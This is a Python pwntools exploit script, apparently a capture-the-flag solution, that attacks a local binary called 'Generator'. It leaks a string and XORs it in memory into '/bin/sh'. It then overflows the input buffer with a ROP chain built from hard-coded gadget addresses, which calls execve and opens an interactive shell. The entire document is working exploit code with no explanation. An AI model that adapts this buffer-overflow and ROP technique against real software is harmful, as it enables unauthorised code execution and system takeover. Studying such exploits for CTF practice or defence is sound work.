from pwn import *

r = process("./Generator")

xor_ptr_rdi_rsi = p64(0x4011FE)
pop_rdi_rsi_rdx = p64(0x401202)
pop_rsi_rdx		= p64(0x401203)
xchg_rax_rdx	= p64(0x401206)
syscall			= p64(0x401209)
random_str		= p64(0x404080)

string = r.recvuntil(b"\n").split(b" ")[-1].strip()
print(f"Leaked string: {string}")

# [::-1] because the string will be xored in little endian in the program
xor_val = int(binascii.hexlify((string + b"\x00")[::-1]), 16) ^ int(binascii.hexlify(b"/bin/sh\x00"[::-1]), 16)
print(f"XOR value to have \"/bin/sh\": {hex(xor_val)}")

rop = b"yes"
rop += b"A" * 14

rop += pop_rdi_rsi_rdx
rop += random_str
rop += p64(xor_val)
rop += p64(0x3b)

rop += xchg_rax_rdx
rop += xor_ptr_rdi_rsi

rop += pop_rsi_rdx
rop += p64(0)
rop += p64(0)

rop += syscall

# pause()
log.success(f"ROPchain length: {len(rop)}")
r.sendline(rop)
r.interactive()
